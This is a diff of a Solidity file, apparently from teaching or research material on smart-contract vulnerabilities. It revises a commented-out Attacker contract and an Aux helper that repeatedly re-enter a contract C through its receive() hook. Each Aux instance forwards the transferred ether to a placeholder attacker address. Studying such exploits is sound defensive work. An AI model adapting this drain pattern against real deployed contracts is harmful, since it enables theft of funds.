@@ -32,25 +32,24 @@ contract C {
 // the money transferred to each new instance is eventually sent and accumulated by the Attacker contract
 
 // contract Attacker {
-//     bytes private initCode;
+//     bytes private create_aux_initcode;
 //     address private victim;
-
-//     constructor(address _victim) { 
-//         bytes memory bytecode = type(Aux).creationCode;
-//         initCode = abi.encodePacked(bytecode, abi.encode(_victim));
+//     constructor(bytes memory _create_aux_initcode, address _victim) payable {    // the first argument represents the (byte-encoded) code of the constructor of the Aux contract
+//         create_aux_initcode = _create_aux_initcode;
 //         victim = _victim;
 //     }
 //     function attack() public {
-//         C(victim).deposit{value: 1000}();
-//         C(victim).deploy_and_transfer(initCode);
+//         C(victim).deposit{value: 0.001 ether}();
+//         C(victim).deploy_and_transfer(create_aux_initcode);
 //     }
 //     receive() external payable {
-//         C(victim).deploy_and_transfer(initCode);
+//         C(victim).deploy_and_transfer(create_aux_initcode);
 //     }
 // }
 
 // contract Aux {
-//     constructor(address payable attacker) payable {
-//         attacker.transfer(msg.value);
+//     address attacker = 0xCAfEcAfeCAfECaFeCaFecaFecaFECafECafeCaFe; // "REPLACE HERE ATTACKER EOA ADDRESS";
+//     constructor() payable {
+//         payable(attacker).transfer(msg.value);
 //     }
 // }
